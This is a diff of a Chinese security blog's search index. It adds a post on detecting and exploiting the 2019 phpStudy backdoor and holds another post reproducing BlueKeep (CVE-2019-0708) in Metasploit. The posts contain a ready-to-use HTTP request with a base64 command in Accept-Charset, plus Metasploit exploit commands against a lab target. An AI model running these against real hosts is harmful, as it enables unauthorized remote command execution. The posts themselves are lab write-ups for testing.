@@ -1,6 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[phpStudy后门测试]]></title>
+    <url>%2Fphpstudy-backdoor%2F</url>
+    <content type="text"><![CDATA[前言 后门检测 后门利用 一. 前言9月20公布的phpStudy官网被控，被黑客植入恶意后门的事件引起了极大的关注，影响极为广泛，本文简单写一下自查和利用。 二. 后门检测从发布的资料上主要出现在以下版本的php中 php5.4.45 php5.2.17 phpStudy版本主要是在20180211和20161103俩个版本，但据说其他版本也存在这种情况。 在phpStudy安装目录中查找php\php-5.4.45\ext目录下的php_xmlrpc.dll文件，记事本打开，查找关键词eval，可以看到如下内容即证明存在后门 三. 后门利用首先启动对应版本的php 访问主页并插入exp 123456789GET / HTTP/1.1Host: 192.168.242.131Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Accept-Encoding:gzip,deflateAccept-Charset:c3lzdGVtKCJuZXQgdXNlciIpOw==Accept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: close Accept-Charset字段经过base64加密，原文中字段解码后为system(&quot;net user&quot;);，需要注意的是在直接构造该请求时，需要在Accept-Charset字段后添加两个换行，不然会出现不响应的情况。此外Accept-Encoding字段值必须为gzip,deflate，才能去判断是否存在Accept-Charset字段，读取该字段的值。 参考 phpStudy后门简要分析 phpStudy遭黑客入侵植入后门事件披露 | 微步在线报告 数十万PhpStudy用户被植入后门，快来检测你是否已沦为“肉鸡”！]]></content>
+      <categories>
+        <category>攻击测试</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>PHPstudy</tag>
+        <tag>后门</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[CVE-2019-0708复现]]></title>
     <url>%2FCVE-2019-0708%2F</url>
     <content type="text"><![CDATA[前言 准备工作 复现过程 一. 前言1. 关于CVE-2019-0708CVE-2019-0708这个漏洞从5月多发布出来之后可以说一直引起了广泛的关注，几乎整个安全行业的人都在关注着他的发展。这两天exp发布出来之后更是引起了极大的反响，感觉所有人都在说这个东西。这篇文章就简单的说一下这个漏洞还有最新的exp，以及复现的过程。 这个漏洞涵盖了windows7及以下的所有版本，覆盖范围相当的广，危害及其严重。原理可以简单的认为是修改内存内容，执行恶意请求，具体的原理有很多大佬都有分析，就不丢人了。 二. 准备工作1. 复现环境 攻击机 kali Linux （内置msf） 靶机 Windows 7 ultimate sp1 x64 2. 准备工作2.1 更新系统和msf这个就不用多说了吧，一行命令就完了，速度慢的记得换源。 2.2 导入exp先从网上下载exp包，然后把里面的东西导入对应的目录，我的msf目录是/usr/share/metasploit-framework 1234rdp.rb -&gt; /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rbrdp_scanner.rb -&gt; /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rbcve_2019_0708_bluekeep.rb -&gt; /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rbcve_2019_0708_bluekeep_rce.rb -&gt; /usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb 有的目录没有的创建一个就行了，记得修改一下权限644，不过不改好像也没事。 三. 复现过程1. 启动msfs12/etc/init.d/postgresql startmsfconsole 2. 重新加载exp文件1reload_all 3. 加载攻击模块1use exploit/windows/rdp/cve_2019_0708_bluekeep_rce 4. 设置攻击参数123set rhost 192.168.242.131set target 3 #因为我的靶机是VMware虚拟机，所以这里选择3，具体选择什么可以输入info查看提示show options #确认攻击参数 5. 攻击输入exploit开始攻击，如下则攻击成功，可以看到是system权限 至此攻击复现已经完成，可以看到还是很强的，而且靶机是没有任何交互和提示的，悄无声息的就完成了攻击，不得不说大佬还是大佬。 参考 0708MSF攻击套件安装 CVE-2019-0708远程桌面代码执行漏洞复现 【合天网安实验室】Demo-BlueKeep（CVE-2019-0708）漏洞验证演示]]></content>
@@ -22,8 +35,8 @@
         <category>攻击测试</category>
       </categories>
       <tags>
-        <tag>Metasploit</tag>
         <tag>kali Linux</tag>
+        <tag>Metasploit</tag>
         <tag>攻击测试</tag>
         <tag>木马攻击</tag>
         <tag>UAC提权</tag>
@@ -140,8 +153,8 @@
         <category>攻击测试</category>
       </categories>
       <tags>
-        <tag>Metasploit</tag>
         <tag>kali Linux</tag>
+        <tag>Metasploit</tag>
         <tag>攻击测试</tag>
         <tag>Ettercap</tag>
         <tag>browser_autopwn2</tag>
@@ -194,10 +207,10 @@
         <category>工具使用</category>
       </categories>
       <tags>
+        <tag>kali Linux</tag>
         <tag>Social-Engineer-Toolkit</tag>
         <tag>钓鱼网站</tag>
         <tag>社工</tag>
-        <tag>kali Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -221,9 +234,9 @@
         <category>环境搭建</category>
       </categories>
       <tags>
-        <tag>kali Linux</tag>
         <tag>环境搭建</tag>
         <tag>Shellinabox</tag>
+        <tag>kali Linux</tag>
         <tag>Ngrok</tag>
       </tags>
   </entry>
